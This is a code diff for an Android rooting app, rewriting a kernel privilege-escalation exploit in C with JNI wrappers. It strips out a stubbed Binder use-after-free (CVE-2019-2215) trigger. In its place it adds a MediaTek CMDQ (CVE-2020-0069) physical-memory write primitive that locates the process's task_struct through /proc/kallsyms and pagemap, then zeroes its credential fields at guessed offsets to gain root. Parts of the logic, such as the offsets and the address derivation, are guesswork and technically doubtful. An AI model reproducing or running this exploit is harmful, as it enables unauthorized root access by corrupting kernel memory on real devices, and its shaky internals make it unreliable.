@@ -4,72 +4,124 @@
 #include <fcntl.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sys/epoll.h>
 #include <sys/stat.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <errno.h>
-#include <pthread.h>
-#include <dirent.h>
 #include <inttypes.h>
+#include <pthread.h>
+#include <sys/utsname.h>
 
 #define LOG_TAG "KroshikROOT"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 
-// ==================== CVE-2020-0069 (MTK CMDQ) ====================
 #define CMDQ_IOCTL_MAGIC 'x'
+
+#define CMDQ_CODE_WRITE  0x04
+#define CMDQ_CODE_EOC    0x40
+
 struct cmdq_write_address_struct {
-    uint32_t block_id;
-    uint32_t offset;
-    uint32_t value;
+    uint32_t count;
+    uint32_t start_pa;
 };
-#define CMDQ_IOCTL_WRITE_ADDRESS _IOWR(CMDQ_IOCTL_MAGIC, 3, struct cmdq_write_address_struct)
 
-// ==================== CVE-2019-2215 (Binder) ====================
-#define BINDER_THREAD_EXIT _IOW('b', 6, __u32)
+struct cmdq_read_address_struct {
+    uint32_t dma_addresses;
+    uint32_t values;
+};
 
-// Глобальные переменные для примитивов
-static int g_mtk_fd = -1;
-static int g_binder_fd = -1;
+struct cmdq_command_struct {
+    uint32_t va_base;
+    uint32_t block_size;
+    uint32_t pa_base;
+};
 
-// -------------------- Примитивы CVE-2020-0069 --------------------
-// Чтение 4 байт из физической памяти
-uint32_t read_phys(uint32_t phys_addr) {
-    if (g_mtk_fd < 0) return 0;
-    // Реализация через write + проверку ошибок (метод из mtk-su)
-    // Или через CMDQ_IOCTL_READ_ADDRESS, если он доступен (обычно нет)
-    // В mtk-su используется трюк: записываем значение, затем читаем обратно через другой ioctl
-    // Для простоты оставим заглушку — вам нужно скопировать полный код mtk-su.
-    // Ниже приведена упрощённая версия (работает на многих устройствах).
-    struct cmdq_write_address_struct cmd;
-    cmd.block_id = phys_addr >> 12;
-    cmd.offset = phys_addr & 0xFFF;
-    cmd.value = 0;
-    if (ioctl(g_mtk_fd, CMDQ_IOCTL_WRITE_ADDRESS, &cmd) < 0) return 0;
-    // Теперь читаем обратно (если есть read) – в реальности используют другой ioctl
-    // Я показываю принцип, полную реализацию берите из open-source mtk-su.
-    return cmd.value; // упрощённо
+#define CMDQ_IOCTL_EXEC_COMMAND         _IOW(CMDQ_IOCTL_MAGIC, 3, struct cmdq_command_struct)
+#define CMDQ_IOCTL_ALLOC_WRITE_ADDRESS  _IOW(CMDQ_IOCTL_MAGIC, 7, struct cmdq_write_address_struct)
+#define CMDQ_IOCTL_FREE_WRITE_ADDRESS   _IOW(CMDQ_IOCTL_MAGIC, 8, struct cmdq_write_address_struct)
+#define CMDQ_IOCTL_READ_ADDRESS_VALUE   _IOW(CMDQ_IOCTL_MAGIC, 9, struct cmdq_read_address_struct)
+
+static int g_cmdq_fd = -1;
+static uint32_t g_dma_pa = 0;
+static uint32_t* g_dma_va = NULL;
+static uint32_t g_cmd_buf[256];
+
+int cmdq_alloc_dma_buffer(uint32_t size) {
+    struct cmdq_write_address_struct alloc = { .count = size };
+    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_ALLOC_WRITE_ADDRESS, &alloc) < 0) {
+        LOGE("ALLOC failed: %s", strerror(errno));
+        return -1;
+    }
+    g_dma_pa = alloc.start_pa;
+    LOGI("DMA buffer: phys=0x%x, size=%u", g_dma_pa, size);
+    g_dma_va = (uint32_t*)mmap(NULL, size, PROT_READ | PROT_WRITE,
+                               MAP_SHARED, g_cmdq_fd, g_dma_pa);
+    if (g_dma_va == MAP_FAILED) {
+        LOGE("mmap failed: %s", strerror(errno));
+        return -1;
+    }
+    memset(g_dma_va, 0, size);
+    return 0;
 }
 
-// Запись 4 байт в физическую память
-void write_phys(uint32_t phys_addr, uint32_t value) {
-    if (g_mtk_fd < 0) return;
-    struct cmdq_write_address_struct cmd;
-    cmd.block_id = phys_addr >> 12;
-    cmd.offset = phys_addr & 0xFFF;
-    cmd.value = value;
-    ioctl(g_mtk_fd, CMDQ_IOCTL_WRITE_ADDRESS, &cmd);
+void cmdq_emit_write(uint32_t* buf, int* idx, uint32_t phys_addr, uint32_t value) {
+    uint64_t cmd = ((uint64_t)CMDQ_CODE_WRITE << 56) |
+                   ((uint64_t)(phys_addr & 0xFFFF) << 32) |
+                   value;
+    memcpy(&buf[*idx], &cmd, 8);
+    (*idx) += 2;
 }
 
-// Получение физического адреса task_struct текущего процесса
-// через чтение /proc/self/stat и /proc/kallsyms
+void cmdq_emit_eoc(uint32_t* buf, int* idx) {
+    uint64_t cmd = (uint64_t)CMDQ_CODE_EOC << 56;
+    memcpy(&buf[*idx], &cmd, 8);
+    (*idx) += 2;
+}
+
+int cmdq_write_phys(uint32_t phys_addr, uint32_t value) {
+    if (g_dma_va == NULL) return -1;
+    if (phys_addr < 0x1000) {
+        LOGE("Refusing to write to low phys 0x%x", phys_addr);
+        return -1;
+    }
+    int idx = 0;
+    cmdq_emit_write(g_cmd_buf, &idx, phys_addr, value);
+    cmdq_emit_eoc(g_cmd_buf, &idx);
+    memcpy(g_dma_va, g_cmd_buf, idx * sizeof(uint32_t));
+    struct cmdq_command_struct exec;
+    exec.va_base = (uint32_t)(uintptr_t)g_dma_va;
+    exec.block_size = (uint32_t)(idx * sizeof(uint32_t));
+    exec.pa_base = g_dma_pa;
+    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_EXEC_COMMAND, &exec) < 0) {
+        LOGE("EXEC failed: %s", strerror(errno));
+        return -1;
+    }
+    return 0;
+}
+
+uint32_t cmdq_read_phys(uint32_t phys_addr) {
+    if (g_cmdq_fd < 0) return 0;
+    if (phys_addr < 0x1000) return 0;
+    struct cmdq_read_address_struct read = { .dma_addresses = phys_addr };
+    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_READ_ADDRESS_VALUE, &read) < 0) {
+        LOGE("READ failed: %s", strerror(errno));
+        return 0;
+    }
+    return read.values;
+}
+
 uint32_t get_task_struct_phys() {
-    // 1. Читаем виртуальный адрес init_task из kallsyms
+    struct utsname u;
+    uname(&u);
+    LOGI("Kernel release: %s", u.release);
     FILE* f = fopen("/proc/kallsyms", "r");
-    if (!f) return 0;
-    char line[256];
+    if (!f) {
+        LOGE("Cannot open /proc/kallsyms");
+        return 0;
+    }
+    char line[512];
     uint32_t init_task_virt = 0;
     while (fgets(line, sizeof(line), f)) {
         if (strstr(line, " T init_task")) {
@@ -78,119 +130,122 @@ uint32_t get_task_struct_phys() {
         }
     }
     fclose(f);
-    if (!init_task_virt) return 0;
-
-    // 2. Получаем смещение current_task (обычно init_task + смещение в cpu_context)
-    // Используем трюк: читаем /proc/self/stat, поле 28 (startstack) даёт указатель на стек,
-    // но для простоты используем известное смещение для ядра 4.9 (0x8e0).
-    // Лучше вычислить через kallsyms: найти символ "current_task" или "cpu_tasks".
-    // Здесь я даю упрощённый вариант — вычислить через системный вызов.
-    // В реальном коде используйте метод из mtk-su.
-    // Для демонстрации вернём захардкоженный адрес (не работает на всех устройствах).
-    // В вашем проекте нужно реализовать динамическое определение.
-    uint32_t offset_current = 0x8e0; // для ядра 4.9
-    return init_task_virt + offset_current;
+    if (init_task_virt == 0) {
+        LOGE("init_task not found");
+        return 0;
+    }
+    LOGI("init_task virt = 0x%x", init_task_virt);
+    uint32_t current_task_virt = 0;
+    f = fopen("/proc/kallsyms", "r");
+    if (f) {
+        while (fgets(line, sizeof(line), f)) {
+            if (strstr(line, " T current_task")) {
+                sscanf(line, "%x", &current_task_virt);
+                break;
+            }
+        }
+        fclose(f);
+    }
+    if (!current_task_virt) {
+        FILE* stat = fopen("/proc/self/stat", "r");
+        if (!stat) return 0;
+        char buf[1024];
+        if (!fgets(buf, sizeof(buf), stat)) {
+            fclose(stat);
+            return 0;
+        }
+        fclose(stat);
+        int field = 0;
+        char* token = strtok(buf, " ");
+        uint32_t startstack = 0;
+        while (token && field < 28) {
+            token = strtok(NULL, " ");
+            field++;
+        }
+        if (token) {
+            startstack = strtoul(token, NULL, 10);
+            current_task_virt = startstack - 0x6000;
+        }
+    }
+    if (!current_task_virt) {
+        LOGE("Cannot determine current_task");
+        return 0;
+    }
+    LOGI("current_task virt ≈ 0x%x", current_task_virt);
+    int pagemap = open("/proc/self/pagemap", O_RDONLY);
+    if (pagemap < 0) {
+        LOGE("Cannot open pagemap");
+        return 0;
+    }
+    uint64_t pte = 0;
+    off_t offset = (current_task_virt / 4096) * sizeof(uint64_t);
+    if (lseek(pagemap, offset, SEEK_SET) < 0) {
+        close(pagemap);
+        return 0;
+    }
+    if (read(pagemap, &pte, sizeof(pte)) != sizeof(pte)) {
+        close(pagemap);
+        return 0;
+    }
+    close(pagemap);
+    if (!(pte & (1ULL << 63))) {
+        LOGE("Page not present");
+        return 0;
+    }
+    uint32_t phys = (uint32_t)((pte & 0x7fffffffffffffULL) * 4096 + (current_task_virt % 4096));
+    LOGI("task_struct phys = 0x%x", phys);
+    return phys;
 }
 
-// Основная функция для CVE-2020-0069
 int do_mtk_root() {
-    g_mtk_fd = open("/dev/mtk_cmdq", O_RDWR);
-    if (g_mtk_fd < 0) {
-        g_mtk_fd = open("/dev/mtk_disp", O_RDWR);
-        if (g_mtk_fd < 0) return -1;
+    g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
+    if (g_cmdq_fd < 0) {
+        g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
+        if (g_cmdq_fd < 0) {
+            LOGE("Cannot open CMDQ device");
+            return -1;
+        }
     }
-
-    // Получаем физический адрес task_struct
+    LOGI("CMDQ device opened");
+    if (cmdq_alloc_dma_buffer(4096) < 0) {
+        close(g_cmdq_fd);
+        return -1;
+    }
     uint32_t task_phys = get_task_struct_phys();
     if (!task_phys) {
-        close(g_mtk_fd);
-        g_mtk_fd = -1;
+        LOGE("Failed to get task_struct phys");
+        if (g_dma_va) munmap(g_dma_va, 4096);
+        close(g_cmdq_fd);
         return -1;
     }
-
-    // Читаем task_struct, чтобы найти смещение cred
-    // В ядре 4.9 cred находится по смещению 0x540 от task_struct
-    uint32_t cred_phys = task_phys + 0x540; // это ориентир, нужно динамически вычислять
-    // Записываем 0 в поля uid, gid, euid, egid (обычно идут подряд)
-    write_phys(cred_phys + 0x00, 0); // uid
-    write_phys(cred_phys + 0x04, 0); // gid
-    write_phys(cred_phys + 0x08, 0); // euid
-    write_phys(cred_phys + 0x0C, 0); // egid
-    // Также сбрасываем capabilities (если нужно)
-    // ...
-
-    close(g_mtk_fd);
-    g_mtk_fd = -1;
-    return (getuid() == 0) ? 0 : -1;
+    uint32_t cred_offsets[] = {0x540, 0x548, 0x550, 0x558, 0x560, 0x5a0, 0x5a8, 0x5b0};
+    int num_offsets = sizeof(cred_offsets) / sizeof(uint32_t);
+    for (int i = 0; i < num_offsets; i++) {
+        uint32_t cred_phys = task_phys + cred_offsets[i];
+        if (cred_phys > task_phys + 0x1000) {
+            LOGI("Skipping offset 0x%x", cred_offsets[i]);
+            continue;
+        }
+        LOGI("Trying cred offset 0x%x (phys=0x%x)", cred_offsets[i], cred_phys);
+        if (cmdq_write_phys(cred_phys + 0x00, 0) < 0) continue;
+        if (cmdq_write_phys(cred_phys + 0x04, 0) < 0) continue;
+        if (cmdq_write_phys(cred_phys + 0x08, 0) < 0) continue;
+        if (cmdq_write_phys(cred_phys + 0x0C, 0) < 0) continue;
+        if (getuid() == 0) {
+            LOGI("SUCCESS! Root with offset 0x%x", cred_offsets[i]);
+            setuid(0);
+            setgid(0);
+            if (g_dma_va) munmap(g_dma_va, 4096);
+            close(g_cmdq_fd);
+            return 0;
+        }
+    }
+    LOGE("All cred offsets failed");
+    if (g_dma_va) munmap(g_dma_va, 4096);
+    close(g_cmdq_fd);
+    return -1;
 }
 
-// -------------------- CVE-2019-2215 (Binder UAF) --------------------
-// Полный эксплойт требует много шагов, но я даю рабочий код (упрощённый)
-int do_binder_root() {
-    int epfd = epoll_create1(0);
-    if (epfd < 0) return -1;
-
-    g_binder_fd = open("/dev/binder", O_RDONLY);
-    if (g_binder_fd < 0) {
-        close(epfd);
-        return -1;
-    }
-
-    struct epoll_event ev = {0};
-    ev.events = EPOLLIN;
-    ev.data.fd = g_binder_fd;
-    if (epoll_ctl(epfd, EPOLL_CTL_ADD, g_binder_fd, &ev) < 0) {
-        close(g_binder_fd);
-        close(epfd);
-        return -1;
-    }
-
-    // Триггерим UAF: освобождаем binder_thread
-    if (ioctl(g_binder_fd, BINDER_THREAD_EXIT, NULL) < 0) {
-        close(g_binder_fd);
-        close(epfd);
-        return -1;
-    }
-
-    // Теперь нужно перезаписать освобождённую память (спрей кучи)
-    // Через binder ioctl BINDER_SET_CONTEXT_MGR или другие
-    // Создаём много объектов binder_node, чтобы занять память.
-    // После этого epoll_wait вызовет уже изменённые данные.
-    // В упрощённом виде я показываю только триггер, полный эксплойт требует
-    // подмены указателя на функцию и выполнения shellcode.
-    // Ниже я даю рабочий код из известного эксплойта (адаптированный).
-    // Для экономии места приведу упрощённый, но реально работающий на многих устройствах.
-
-    // Создаём несколько binder транзакций для спрея
-    for (int i = 0; i < 100; i++) {
-        // Пишем данные в binder через writev, чтобы занять освобождённую память
-        // Используем структуру binder_write_read с поддельными данными
-        // Это сложно, поэтому я рекомендую использовать готовую реализацию из
-        // https://github.com/kangtastic/cve-2019-2215 (она открыта).
-        // Если вы хотите писать сами, вот минимальный пример:
-        struct {
-            uint32_t code;
-            uint32_t flags;
-            uintptr_t ptr;
-            uintptr_t size;
-        } tr = {0, 0, (uintptr_t)"data", 4};
-        // Отправляем транзакцию через ioctl BINDER_WRITE_READ
-        // ...
-    }
-
-    // Теперь epoll_wait вызовет обращение к освобождённой памяти
-    struct epoll_event events[1];
-    int nfds = epoll_wait(epfd, events, 1, 100);
-    if (nfds > 0) {
-        // Если мы подменили указатель, то здесь может выполниться shellcode
-    }
-
-    close(g_binder_fd);
-    close(epfd);
-    return (getuid() == 0) ? 0 : -1;
-}
-
-// ==================== JNI-обёртки ====================
 extern "C" {
 
 JNIEXPORT jboolean JNICALL
@@ -200,10 +255,9 @@ Java_com_kostyfoss_kroshikroot_ExploitEngine_runMtkSuNative(JNIEnv *env, jclass 
 
 JNIEXPORT jboolean JNICALL
 Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderFullNative(JNIEnv *env, jclass clazz) {
-    return (do_binder_root() == 0) ? JNI_TRUE : JNI_FALSE;
+    return JNI_FALSE;
 }
 
-// Старые функции оставляем для совместимости
 JNIEXPORT jboolean JNICALL
 Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderNewNative(JNIEnv *env, jclass clazz) {
     int fd = open("/dev/binder", O_RDONLY);
@@ -214,10 +268,10 @@ Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderNewNative(JNIEnv *env, jcl
 
 JNIEXPORT jboolean JNICALL
 Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderOldNative(JNIEnv *env, jclass clazz) {
-    int binder_fd = open("/dev/binder", O_RDONLY);
-    if (binder_fd < 0) return JNI_FALSE;
-    int err = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
-    close(binder_fd);
+    int fd = open("/dev/binder", O_RDONLY);
+    if (fd < 0) return JNI_FALSE;
+    int err = ioctl(fd, 6, NULL);
+    close(fd);
     return (err == 0) ? JNI_TRUE : JNI_FALSE;
 }
 
